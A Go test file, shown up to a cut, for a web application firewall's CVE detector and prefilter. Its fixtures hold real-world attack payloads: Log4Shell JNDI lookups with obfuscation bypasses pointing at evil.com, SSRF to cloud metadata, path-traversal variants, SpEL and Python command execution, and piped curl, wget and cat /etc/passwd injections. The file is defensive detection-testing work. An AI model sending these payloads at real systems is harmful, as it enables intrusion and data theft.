package cve

import (
	"strings"
	"testing"
)

var benchmarkCVERequestSink *CVERequest
var benchmarkCVERequestFieldSink int
var benchmarkCVEMatchesSink []CVEMatch

func TestLowerTargetsContainAny(t *testing.T) {
	tests := []struct {
		name    string
		targets []string
		needles []string
		want    bool
	}{
		{name: "empty targets", targets: nil, needles: []string{"jndi"}, want: false},
		{name: "single needle match", targets: []string{"path=/api", "x=${jndi:ldap://evil/a}"}, needles: []string{"jndi:"}, want: true},
		{name: "single needle miss", targets: []string{"path=/api", "page=1"}, needles: []string{"jndi:"}, want: false},
		{name: "multi needle match", targets: []string{"path=/api", "content-type: application/json", "body=auto_prepend_file=php://input"}, needles: []string{"%ad", "auto_prepend_file", "allow_url_include"}, want: true},
		{name: "multi needle miss", targets: []string{"path=/api", "content-type: application/json", "body=username=admin"}, needles: []string{"%ad", "auto_prepend_file", "allow_url_include"}, want: false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := lowerTargetsContainAny(tt.targets, tt.needles...); got != tt.want {
				t.Fatalf("lowerTargetsContainAny() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestCombinedLowerTargetsContainAnyDoesNotCrossTargetBoundary(t *testing.T) {
	targets := []string{"path=/ab", "body=cd"}
	combined := joinLowerTargets(targets)
	if combinedLowerTargetsContainAny(len(targets), combined, "/abcd") {
		t.Fatal("combined lower target scan must not match across target boundary")
	}
	if !combinedLowerTargetsContainAny(len(targets), combined, "path=/ab") {
		t.Fatal("combined lower target scan should match first target")
	}
	if !combinedLowerTargetsContainAny(len(targets), combined, "body=cd") {
		t.Fatal("combined lower target scan should match second target")
	}
	if combinedLowerTargetsContainAny(0, "", "") {
		t.Fatal("empty target set should keep lowerTargetsContainAny no-target semantics")
	}
}

func TestRequestTargetContainsAnyAllUsesCombinedLowerSafely(t *testing.T) {
	req := BuildCVERequest("/ab", "", nil, []byte("cd"), "text/plain")
	if requestTargetContainsAny(req, "all", "/abcd") {
		t.Fatal("all-target scan must not match across URL/body boundary")
	}
	if !requestTargetContainsAny(req, "all", "/ab") {
		t.Fatal("all-target scan should match URL target")
	}
	if !requestTargetContainsAny(req, "all", "cd") {
		t.Fatal("all-target scan should match body target")
	}
}

func TestCVEPrefilterIgnoresBrowserUserAgentPunctuation(t *testing.T) {
	req := BuildCVERequest("/api/users", "page=1", map[string]string{
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Host":       "example.com",
	}, nil, "")
	if hasCVESuspiciousContent(req) {
		t.Fatal("browser User-Agent punctuation should not force expensive CVE regex scanning")
	}
}

func TestCVEPrefilterKeepsExploitPunctuation(t *testing.T) {
	req := BuildCVERequest("/", "x=${jndi:ldap://evil.example/a}", nil, nil, "")
	if !hasCVESuspiciousContent(req) {
		t.Fatal("exploit punctuation should still enter CVE scanning")
	}
}

func TestCVEPrefilterIgnoresNormalJSONPunctuation(t *testing.T) {
	req := BuildCVERequest("/api/login", "", map[string]string{"Host": "example.com"}, []byte(`{"username":"admin","password":"test123"}`), "application/json")
	if hasCVESuspiciousContent(req) {
		t.Fatal("normal JSON punctuation should not force expensive CVE regex scanning")
	}
}

func TestCVEPrefilterKeepsHTTPSmugglingHeaders(t *testing.T) {
	req := BuildCVERequest("/api/login", "", map[string]string{
		"Content-Length":    "5",
		"Transfer-Encoding": "chunked",
		"Host":              "example.com",
	}, nil, "")
	if !hasCVESuspiciousContent(req) {
		t.Fatal("HTTP smuggling headers should enter CVE scanning")
	}
}

func TestCVEPrefilterKeepsKnownIndicators(t *testing.T) {
	tests := []struct {
		name        string
		path        string
		query       string
		headers     map[string]string
		body        string
		contentType string
	}{
		{name: "ssrf-url", path: "/fetch", query: "url=http://169.254.169.254/latest/meta-data/"},
		{name: "log4shell", path: "/", query: "x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D"},
		{name: "path-traversal", path: "/files/../../../../etc/passwd"},
		{name: "nextjs-middleware", path: "/", headers: map[string]string{"X-Middleware-Subrequest": "middleware"}},
		{name: "sharepoint-toolshell", path: "/_layouts/15/ToolPane.aspx", body: "MSOTlPn_DWP=payload&__VIEWSTATE=large"},
		{name: "sensitive-file", path: "/.git/config"},
		{name: "command-exec", path: "/cgi-bin/ping.cgi", query: "cmd=whoami"},
		{name: "dangerous-charset", path: "/upload", body: "charset=utf-7", contentType: "multipart/form-data; boundary=abc"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := BuildCVERequest(tt.path, tt.query, tt.headers, []byte(tt.body), tt.contentType)
			if !hasCVESuspiciousContent(req) {
				t.Fatalf("expected CVE prefilter to keep %s", tt.name)
			}
		})
	}
}

func TestRawCVEPrefilterMatchesCVEFastPathBoundaries(t *testing.T) {
	cleanHeaders := map[string]string{
		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Host":            "example.com",
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
	}
	cleanBody := []byte(`{"username":"admin","password":"test123"}`)
	if HasRawCVESuspiciousContent("/api/login", "page=1&sort=name", cleanHeaders, cleanBody, "application/json") {
		t.Fatal("clean login request should skip full CVE request construction")
	}

	tests := []struct {
		name        string
		path        string
		query       string
		headers     map[string]string
		body        []byte
		contentType string
	}{
		{name: "encoded-log4shell", path: "/", query: "x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D"},
		{name: "ssrf", path: "/fetch", query: "url=http://169.254.169.254/latest/meta-data/"},
		{name: "base64-body", path: "/api/run", body: []byte("d2hvYW1p"), contentType: "text/plain"},
		{name: "http-smuggling", path: "/", headers: map[string]string{"Content-Length": "10", "Transfer-Encoding": "chunked"}},
		{name: "http-smuggling-mixed-case", path: "/", headers: map[string]string{"content-length": "10", "tRaNsFeR-eNcOdInG": "chunked"}},
		{name: "nextjs-middleware-mixed-case", path: "/", headers: map[string]string{"x-Middleware-SubRequest": "middleware"}},
		{name: "dangerous-charset", path: "/upload", body: []byte("charset=utf-7"), contentType: "multipart/form-data; boundary=abc"},
		{name: "sharepoint-body", path: "/upload", body: []byte("MSOTlPn_DWP=payload&__VIEWSTATE=large"), contentType: "application/x-www-form-urlencoded"},
		{name: "json-command-token", path: "/api/run", body: []byte(`{"cmd":"whoami"}`), contentType: "application/json"},
		{name: "json-sharepoint-token", path: "/api/upload", body: []byte(`{"state":"__VIEWSTATE"}`), contentType: "application/json"},
		{name: "json-spring-gateway-token", path: "/api/routes", body: []byte(`{"filters":[{"name":"AddResponseHeader"}]}`), contentType: "application/json"},
		{name: "json-jndi-colon-token", path: "/api/log", body: []byte(`{"name":"jndi:ldap"}`), contentType: "application/json"},
		{name: "json-serialized-object-token", path: "/api/import", body: []byte(`{"value":"O:8"}`), contentType: "application/json"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if !HasRawCVESuspiciousContent(tt.path, tt.query, tt.headers, tt.body, tt.contentType) {
				t.Fatalf("expected raw CVE prefilter to keep %s", tt.name)
			}
		})
	}
}

func TestMultiDecodeKeepsExistingDecodeSemantics(t *testing.T) {
	if got := multiDecode("plain/path"); got != "plain/path" {
		t.Fatalf("plain input changed: %q", got)
	}
	if got := multiDecode("%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D"); got != "${jndi:ldap://evil.example/a}" {
		t.Fatalf("url decoded input mismatch: %q", got)
	}
	if got := multiDecode("a+b"); got != "a b" {
		t.Fatalf("plus decoded input mismatch: %q", got)
	}
	if got := multiDecode("d2hvYW1p"); got != "d2hvYW1p\x00whoami" {
		t.Fatalf("base64 decoded input mismatch: %q", got)
	}
}

func TestBuildCVERequestDeduplicatesOnlyEquivalentTargets(t *testing.T) {
	cleanReq := BuildCVERequest(
		"/api/login",
		"page=1&sort=name",
		map[string]string{
			"User-Agent": "Mozilla/5.0",
			"user-agent": "Mozilla/5.0",
			"Host":       "example.com",
			"host":       "example.com",
		},
		[]byte(`{"username":"admin","password":"test123"}`),
		"application/json",
	)
	if got, want := len(cleanReq.URLTargets), 2; got != want {
		t.Fatalf("clean URL targets length = %d, want %d: %#v", got, want, cleanReq.URLTargets)
	}
	if got, want := len(cleanReq.BodyTargets), 1; got != want {
		t.Fatalf("clean body targets length = %d, want %d: %#v", got, want, cleanReq.BodyTargets)
	}
	if got, want := len(cleanReq.HeaderTargets), 2; got != want {
		t.Fatalf("deduplicated header targets length = %d, want %d: %#v", got, want, cleanReq.HeaderTargets)
	}

	encodedReq := BuildCVERequest(
		"/api/login",
		"x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D",
		map[string]string{"Host": "example.com"},
		[]byte("d2hvYW1p"),
		"text/plain",
	)
	if got, want := len(encodedReq.URLTargets), 3; got != want {
		t.Fatalf("encoded URL targets length = %d, want %d: %#v", got, want, encodedReq.URLTargets)
	}
	if encodedReq.URLTargets[2] != "x=${jndi:ldap://evil.example/a}" {
		t.Fatalf("decoded query target mismatch: %#v", encodedReq.URLTargets)
	}
	if got, want := len(encodedReq.BodyTargets), 2; got != want {
		t.Fatalf("encoded body targets length = %d, want %d: %#v", got, want, encodedReq.BodyTargets)
	}
	if encodedReq.BodyTargets[1] != "d2hvYW1p\x00whoami" {
		t.Fatalf("decoded body target mismatch: %#v", encodedReq.BodyTargets)
	}
}

func TestBuildCVERequestMultipartKeepsMetadataAndSkipsBinaryFileContent(t *testing.T) {
	body := []byte("--abc\r\n" +
		"Content-Disposition: form-data; name=\"image\"; filename=\"photo.jpg\"\r\n" +
		"Content-Type: image/jpeg\r\n" +
		"\r\n" +
		"\xff\xd8\x00#{${$gt$ne binary payload markers}\x00\x01\x02\x03\r\n" +
		"--abc\r\n" +
		"Content-Disposition: form-data; name=\"username\"\r\n" +
		"Content-Type: text/plain; charset=utf-7\r\n" +
		"\r\n" +
		"+ADw-script+AD4-alert(1)+ADw-/script+AD4-\r\n" +
		"--abc--\r\n")

	req := BuildCVERequest("/upload", "", nil, body, "multipart/form-data; boundary=abc")
	if len(req.Body) >= len(body) {
		t.Fatalf("multipart CVE body was not reduced: got %d, raw %d", len(req.Body), len(body))
	}
	for _, forbidden := range []string{"#{", "${", "$gt", "$ne", "binary payload markers"} {
		if strings.Contains(req.Body, forbidden) {
			t.Fatalf("binary file content marker %q leaked into CVE body: %q", forbidden, req.Body)
		}
	}
	for _, required := range []string{"filename=photo.jpg", "content-type=image/jpeg", "name=username", "content-type=text/plain; charset=utf-7", "+ADw-script+AD4-alert(1)+ADw-/script+AD4-"} {
		if !strings.Contains(req.Body, required) {
			t.Fatalf("multipart CVE body missing %q: %q", required, req.Body)
		}
	}

	d := NewCVEDetector()
	matches := d.Detect(req)
	found := false
	for _, m := range matches {
		if m.CVEID == "CVE-2026-21876" {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("dangerous multipart charset was not detected, matches=%v", matches)
	}
}

func BenchmarkBuildCVERequestCleanTraffic(b *testing.B) {
	headers := map[string]string{
		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Host":            "example.com",
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
	}
	body := []byte(`{"username":"admin","password":"test123"}`)

	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		benchmarkCVERequestSink = BuildCVERequest("/api/login", "page=1&sort=name", headers, body, "application/json")
	}
}

func BenchmarkBuildCVERequestIntoCleanTraffic(b *testing.B) {
	headers := map[string]string{
		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Host":            "example.com",
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
	}
	body := []byte(`{"username":"admin","password":"test123"}`)

	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		var req CVERequest
		BuildCVERequestInto(&req, "/api/login", "page=1&sort=name", headers, body, "application/json")
		benchmarkCVERequestFieldSink = len(req.AllTargetsLower)
	}
}

func BenchmarkCVEDetectCleanTraffic(b *testing.B) {
	detector := NewCVEDetector()
	headers := map[string]string{
		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Host":            "example.com",
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
	}
	body := []byte(`{"username":"admin","password":"test123"}`)

	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		req := BuildCVERequest("/api/login", "page=1&sort=name", headers, body, "application/json")
		benchmarkCVEMatchesSink = detector.Detect(req)
	}
}

func TestCVEDetector_PHPDeserialization(t *testing.T) {
	d := NewCVEDetector()

	tests := []struct {
		name    string
		body    string
		wantCVE string
	}{
		{"serialized object", `O:8:"stdClass":1:{s:4:"test";s:5:"value";}`, "CVE-2015-6835"},
		{"serialized array", `a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}`, "CVE-2015-6835"},
		{"unserialize call", `data=unserialize($_GET['input'])`, "CVE-2015-6835"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := BuildCVERequest("/", "", nil, []byte(tt.body), "application/x-www-form-urlencoded")
			matches := d.Detect(req)
			found := false
			for _, m := range matches {
				if m.CVEID == tt.wantCVE {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("expected CVE %s to be detected for input %q", tt.wantCVE, tt.body)
			}
		})
	}
}

func TestCVEDetector_Log4Shell(t *testing.T) {
	d := NewCVEDetector()

	tests := []struct {
		name  string
		input string
	}{
		{"basic jndi ldap", "${jndi:ldap://evil.com/a}"},
		{"basic jndi rmi", "${jndi:rmi://evil.com/a}"},
		{"bypass nested lower", "${${lower:j}ndi:ldap://evil.com/a}"},
		{"bypass j-n split", "${j${::-n}di:ldap://evil.com/a}"},
		{"bypass jn-d split", "${jn${::-d}i:ldap://evil.com/a}"},
		{"url encoded", "%24%7Bjndi:ldap://evil.com/a%7D"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := BuildCVERequest("/", "x="+tt.input, nil, nil, "")
			matches := d.Detect(req)
			found := false
			for _, m := range matches {
				if m.CVEID == "CVE-2021-44228" {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("Log4Shell not detected for: %s", tt.input)
			}
		})
	}
}

func TestCVEDetector_SSRF(t *testing.T) {
	d := NewCVEDetector()

	tests := []struct {
		name  string
		query string
	}{
		{"internal 10.x", "url=http://10.0.0.1/admin"},
		{"internal 172.16", "url=http://172.16.0.1/secret"},
		{"internal 192.168", "url=http://192.168.1.1/config"},
		{"localhost", "url=http://localhost/admin"},
		{"127.0.0.1", "url=http://127.0.0.1/secret"},
		{"cloud metadata", "url=http://169.254.169.254/latest/meta-data/"},
		{"gcloud metadata", "url=http://metadata.google.internal/computeMetadata/v1/"},
		{"file protocol", "url=file:///etc/passwd"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := BuildCVERequest("/fetch", tt.query, nil, nil, "")
			matches := d.Detect(req)
			found := false
			for _, m := range matches {
				if m.CVEID == "CVE-2019-SSRF" {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("SSRF not detected for query: %s", tt.query)
			}
		})
	}
}

func TestCVEDetector_SSRFDoesNotScanHeaderValues(t *testing.T) {
	d := NewCVEDetector()
	req := BuildCVERequest("/_next/static/chunks/app.js", "", map[string]string{"Referer": "http://127.0.0.1:9443/security"}, nil, "")
	matches := d.Detect(req)
	for _, m := range matches {
		if m.CVEID == "CVE-2019-SSRF" {
			t.Fatalf("expected localhost Referer to be ignored for SSRF, got %+v", matches)
		}
	}
}

func TestCVEDetector_HTTPSmugglingHeaders(t *testing.T) {
	d := NewCVEDetector()
	req := BuildCVERequest("/api/login", "", map[string]string{
		"Content-Length":    "5",
		"Transfer-Encoding": "chunked",
		"Host":              "example.com",
	}, nil, "")
	matches := d.Detect(req)
	for _, m := range matches {
		if m.CVEID == "CVE-2023-SMUGGLE" {
			return
		}
	}
	t.Fatalf("expected HTTP smuggling match, got %+v", matches)
}

func TestCVEDetector_CategorySensitivity_OffDisablesGeneralDetector(t *testing.T) {
	d := NewCVEDetector()
	req := BuildCVERequest("/fetch", "url=http://169.254.169.254/latest/meta-data/", nil, nil, "")
	matches := d.Detect(req, map[string]string{"cve_general": "off"})
	for _, m := range matches {
		if m.CVEID == "CVE-2019-SSRF" {
			t.Fatalf("expected cve_general to be disabled, got %+v", matches)
		}
	}
}

func TestCVEDetector_PathTraversal(t *testing.T) {
	d := NewCVEDetector()

	tests := []struct {
		name string
		path string
	}{
		{"double encoded", "/files/%252e%252e%252f%252e%252e%252fetc/passwd"},
		{"windows backslash", "/files/..\\..\\windows\\system32\\config\\sam"},
		{"encoded backslash", "/files/..%5c..%5cwindows"},
		{"null byte", "/files/../../%00"},
		{"quad dot", "/files/....//etc/passwd"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := BuildCVERequest(tt.path, "", nil, nil, "")
			matches := d.Detect(req)
			found := false
			for _, m := range matches {
				if m.CVEID == "CVE-2019-PATHTRA" {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("path traversal not detected for: %s", tt.path)
			}
		})
	}
}

func TestCVEDetector_RecentWebCVEs(t *testing.T) {
	d := NewCVEDetector()

	tests := []struct {
		name        string
		path        string
		query       string
		headers     map[string]string
		body        string
		contentType string
		wantCVE     string
	}{
		{
			name:    "vite fs raw bypass",
			path:    "/@fs/tmp/secret.txt",
			query:   "import&raw??",
			wantCVE: "CVE-2025-30208",
		},
		{
			name:        "langflow validate code rce",
			path:        "/api/v1/validate/code",
			body:        `{"code":"__import__('os').system('id')"}`,
			contentType: "application/json",
			wantCVE:     "CVE-2025-3248",
		},
		{
			name:    "xwiki solrsearch groovy rce",
			path:    "/xwiki/bin/get/Main/SolrSearch",
			query:   "media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln(42)%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D",
			wantCVE: "CVE-2025-24893",
		},
		{
			name:    "panos sessid traversal",
			path:    "/global-protect/login.esp",
			headers: map[string]string{"Cookie": "SESSID=../../../../../var/appweb/sslvpndocs/global-protect/portal/images/x"},
			wantCVE: "CVE-2024-3400",
		},
		{
			name:        "sharepoint toolshell toolpane",
			path:        "/_layouts/15/ToolPane.aspx",
			query:       "DisplayMode=Edit&a=/ToolPane.aspx",
			headers:     map[string]string{"Referer": "/_layouts/SignOut.aspx"},
			body:        "MSOTlPn_DWP=payload&__VIEWSTATE=large",
			contentType: "application/x-www-form-urlencoded",
			wantCVE:     "CVE-2025-53770",
		},
		{
			name:    "sharepoint toolshell web shell",
			path:    "/_layouts/15/spinstall0.aspx",
			wantCVE: "CVE-2025-53770",
		},
		{
			name:        "commvault deploywebpackage rce",
			path:        "/commandcenter/deployWebpackage.do",
			body:        "commcellName=http://attacker.example&servicePack=../../Reports/MetricsUpload/shell/&version=x",
			contentType: "application/x-www-form-urlencoded",
			wantCVE:     "CVE-2025-34028",
		},
		{
			name:        "crs multipart dangerous charset bypass",
			path:        "/upload",
			body:        "--abc\r\nContent-Disposition: form-data; name=\"username\"\r\nContent-Type: text/plain; charset=utf-7\r\n\r\n+ADw-script+AD4-alert(1)+ADw-/script+AD4-\r\n--abc\r\nContent-Disposition: form-data; name=\"dummy\"\r\nContent-Type: text/plain; charset=utf-8\r\n\r\nok\r\n--abc--\r\n",
			contentType: "multipart/form-data; boundary=abc",
			wantCVE:     "CVE-2026-21876",
		},
		{
			name:        "wing ftp null byte lua rce",
			path:        "/loginok.html",
			body:        `username=anonymous%00]]%0dlocal+h+%3d+io.popen("id")%0d--&password=x`,
			contentType: "application/x-www-form-urlencoded",
			wantCVE:     "CVE-2025-47812",
		},
		{
			name:        "magicinfo swupdate traversal file write",
			path:        "/MagicInfo/servlet/SWUpdateFileUploader",
			body:        `fileName=../../../../server/default/deploy/shell.jsp&file=test`,
			contentType: "application/x-www-form-urlencoded",
			wantCVE:     "CVE-2025-4632",
		},
		{
			name:    "fortiweb fwbcgi cgiinfo auth bypass",
			path:    "/api/v2.0/cmd/system/admin%3F/../../../../../cgi-bin/fwbcgi",
			headers: map[string]string{"CGIINFO": "eyJ1c2VybmFtZSI6ImFkbWluIiwicHJvZm5hbWUiOiJwcm9mX2FkbWluIn0="},
			body:    `{}`,
			wantCVE: "CVE-2025-64446",
		},
		{
			name:    "goanywhere license activation auth bypass",
			path:    "/goanywhere/license/Unlicensed.xhtml/watchTowr",
			query:   "javax.faces.ViewState=x&GARequestAction=activate",
			wantCVE: "CVE-2025-10035",
		},
		{
			name:        "spring gateway actuator spel",
			path:        "/actuator/gateway/routes/rce",
			body:        `{"filters":[{"name":"AddResponseHeader","args":{"name":"x","value":"#{T(java.lang.Runtime).getRuntime().exec('id')}"}}]}`,
			contentType: "application/json",
			wantCVE:     "CVE-2025-41243",
		},
		{
			name:        "invision customcss expression rce",
			path:        "/",
			body:        `app=core&module=system&controller=themeeditor&do=customCss&content=%7Bexpression%3D%22die(system('id'))%22%7D`,
			contentType: "application/x-www-form-urlencoded",
			wantCVE:     "CVE-2025-47916",
		},
		{
			name:    "crushftp s3 auth bypass",
			path:    "/WebInterface/function/",
			query:   "command=getUserList&serverGroup=MainUsers",
			headers: map[string]string{"Authorization": "AWS4-HMAC-SHA256 Credential=crushadmin/, SignedHeaders=host, Signature=deadbeef"},
			wantCVE: "CVE-2025-31161",
		},
		{
			name:    "fortinet authhash hostcheck rce",
			path:    "/remote/hostcheck_validate",
			headers: map[string]string{"Cookie": "AuthHash=enc=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"},
			wantCVE: "CVE-2025-32756",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := BuildCVERequest(tt.path, tt.query, tt.headers, []byte(tt.body), tt.contentType)
			matches := d.Detect(req)
			found := false
			for _, m := range matches {
				if m.CVEID == tt.wantCVE {
					found = true
					break
				}
			}
			if !found {
				t.Fatalf("%s not detected, matches=%v", tt.wantCVE, matches)
			}
		})
	}
}

func TestCVERuleRegistry_LowCmdPrefilterKeepsCommandContext(t *testing.T) {
	matches := globalCVERuleRegistry.DetectAll(
		"/password_change.cgi",
		"user=rootxx&pam=&expired=2&old=test|whoami&new1=test2&new2=test2",
		"",
		nil,
	)
	for _, match := range matches {
		if match.CVEID == "CVE-2024-LOWCMD" {
			return
		}
	}
	t.Fatalf("expected CVE-2024-LOWCMD match, got %#v", matches)
}

func TestCVERuleRegistry_LowCmdPrefilterIgnoresEnvParameterValue(t *testing.T) {
	matches := globalCVERuleRegistry.DetectAll(
		"/getconfig/sodar?sv=200&tid=gda&tv=r20230627&st=env",
		"",
		"",
		nil,
	)
	for _, match := range matches {
		if match.CVEID == "CVE-2024-LOWCMD" {
			t.Fatalf("unexpected CVE-2024-LOWCMD match: %#v", matches)
		}
	}
}

func TestRegisteredCVERuleContainsLowCmdSignalByTokenPrefix(t *testing.T) {
	matchTests := []string{
		"cmd=whoami",
		"cmd=id",
		"cmd=hostname",
		"cmd=ifconfig",
		"cmd=ipconfig",
		"cmd=systeminfo",
		"cmd=pwd",
		"cmd=printenv",
		"x|env",
		"x|uname -a",
		"x|who",
		"x|w",
		"x|curl http://example.test/a",
		"x|wget http://example.test/a",
		"x|nslookup example.test",
		"x|dig example.test",
		"x|traceroute example.test",
		"x|net user",
		"x|cat /etc/passwd",
		"x|ls -la",
		"x|ping -c 1 example.test",
	}
	for _, input := range matchTests {
		t.Run(input, func(t *testing.T) {
			if !registeredCVERuleContainsLowCmdSignal(input) {
				t.Fatalf("expected LOWCMD signal for %q", input)
			}
		})
	}

	skipTests := []string{
		"identity=42",
		"hostnamevalue=example",
		"event=env",
		"window=wide",
		"curling=allowed",
		"netuser=plain",
		"pingpong=plain",
	}
	for _, input := range skipTests {
		t.Run(input, func(t *testing.T) {
			if registeredCVERuleContainsLowCmdSignal(input) {
				t.Fatalf("unexpected LOWCMD signal for %q", input)
			}
		})
	}
}

func TestRegisteredCVEAdvancedPrefilterHelpers(t *testing.T) {
	javaMatches := []string{
		"java.lang.runtime getruntime exec",
		"class loader forname",
		"reflect.method invoke",
		"new processbuilder",
		"javax.script engine",
		"scriptenginemanager payload",
		"unsafe allocate",
	}
	for _, input := range javaMatches {
		t.Run("java-match-"+input, func(t *testing.T) {
			if !hasJavaCodeInjectSignalLower(input) {
				t.Fatalf("expected Java code injection signal for %q", input)
			}
		})
	}
	for _, input := range []string{"runtime only", "class only", "reflect.method only", "invoke only"} {
		t.Run("java-skip-"+input, func(t *testing.T) {
			if hasJavaCodeInjectSignalLower(input) {
				t.Fatalf("unexpected Java code injection signal for %q", input)
			}
		})
	}

	spelMatches := []string{
		"#{t(java.lang.runtime)}",
		"%23%7bt(java.lang.runtime)%7d",
		"%24%7bt(java.lang.runtime)%7d",
		"${t(java.lang.runtime)}",
		"ognlutil payload",
		"_memberaccess payload",
		"valuestack payload",
		"#context[x]",
		"#attr[x]",
		"#application[x]",
		"#session[x]",
		"#request[x]",
		"#parameters[x]",
		"#root",
		".getclass().forname",
		"java.lang.runtime",
	}
	for _, input := range spelMatches {
		t.Run("spel-match-"+input, func(t *testing.T) {
			if !hasJavaOGNLSpELSignalLower(input) {
				t.Fatalf("expected Java OGNL/SpEL signal for %q", input)
			}
		})
	}
	for _, input := range []string{"${plain}", "context only", "application only"} {
		t.Run("spel-skip-"+input, func(t *testing.T) {
			if hasJavaOGNLSpELSignalLower(input) {
				t.Fatalf("unexpected Java OGNL/SpEL signal for %q", input)
			}
		})
	}

	pathMatches := []string{
		"../../../../etc/passwd",
		`..\..\..\..\windows\win.ini`,
		"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
		"....//etc/passwd",
		`\.\.\.\.\windows`,
		"%252e%252e/etc/passwd",
		"..%c0%afetc/passwd",
		"..%ef%bc%8fetc/passwd",
		"..%25%35%63windows",
		"..%c1%1cwindows",
		"..%c1%9cwindows",
		"..%c0%9vwindows",
		"..%uff0e%uff0e/etc/passwd",
		"%c0%ae%c0%ae/etc/passwd",
		"..;/etc/passwd",
		"/.%2e/.%2e/etc/passwd",
	}
	for _, input := range pathMatches {
		t.Run("path-match-"+input, func(t *testing.T) {
			if !hasDeepPathTraversalSignalLower(input) {
				t.Fatalf("expected deep path traversal signal for %q", input)
			}
		})
	}
	for _, input := range []string{"../one/../../three", `..\one\..\two`, "%2e%2e%2f%2e%2e%2f%2e%2e%2f"} {
		t.Run("path-skip-"+input, func(t *testing.T) {
			if hasDeepPathTraversalSignalLower(input) {
				t.Fatalf("unexpected deep path traversal signal for %q", input)
			}
		})
	}

	for _, input := range []string{"$gt=1", "$ne=x", "$regex=.*", "$where=this.x", "$exists=true", "$elemmatch=x", "$type=2", "$mod=2"} {
		t.Run("nosql-match-"+input, func(t *testing.T) {
			if !hasNoSQLInjectSignalLower(input) {
				t.Fatalf("expected NoSQL injection signal for %q", input)
			}
		})
	}
	for _, input := range []string{"price=100", "dollar$plain", "$unknown=value"} {
		t.Run("nosql-skip-"+input, func(t *testing.T) {
			if hasNoSQLInjectSignalLower(input) {
				t.Fatalf("unexpected NoSQL injection signal for %q", input)
			}
		})
	}
}

func TestCVEDetector_DetectFirstMatchesDetectFirstResult(t *testing.T) {
	d := NewCVEDetector()

	tests := []struct {
		name        string
		path        string
		query       string
		headers     map[string]string
		body        string
		contentType string
	}{
		{
			name:  "log4shell query",
			path:  "/",
			query: "x=${jndi:ldap://evil.com/a}",
		},
		{
			name:  "ssrf cloud metadata",
			path:  "/fetch",
			query: "url=http://169.254.169.254/latest/meta-data/",
		},
		{
			name:        "php serialized object",
			path:        "/",
			body:        `O:8:"stdClass":1:{s:4:"test";s:5:"value";}`,
			contentType: "application/x-www-form-urlencoded",
		},
		{
			name:        "spring gateway actuator spel",
			path:        "/actuator/gateway/routes/rce",
			body:        `{"filters":[{"name":"AddResponseHeader","args":{"name":"x","value":"#{T(java.lang.Runtime).getRuntime().exec('id')}"}}]}`,
			contentType: "application/json",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := BuildCVERequest(tt.path, tt.query, tt.headers, []byte(tt.body), tt.contentType)
			matches := d.Detect(req)
			if len(matches) == 0 {
				t.Fatal("expected Detect to return a match")
			}
			first, ok := d.DetectFirst(req)
			if !ok {
				t.Fatal("expected DetectFirst to return a match")
			}
			if first != matches[0] {
				t.Fatalf("DetectFirst mismatch: got %#v, want %#v", first, matches[0])
			}
		})
	}
}
func TestCVEDetector_GraphQLTypenameDoesNotTriggerIntrospection(t *testing.T) {
	d := NewCVEDetector()
	body := `[{"operationName":"CurrentContextPrivateByDefault","query":"query CurrentContextPrivateByDefault { sessionUser { id currentContext { id privateByDefault __typename } __typename } }","variables":{}}]`
	req := BuildCVERequest("/graphql", "", map[string]string{
		"Content-Type": "application/json",
		"Origin":       "https://codepen.io",
		"Referer":      "https://codepen.io/pen?&editors=001",
	}, []byte(body), "application/json")
	matches := d.Detect(req)
	for _, match := range matches {
		if match.CVEID == "CVE-2023-GRAPHQL" {
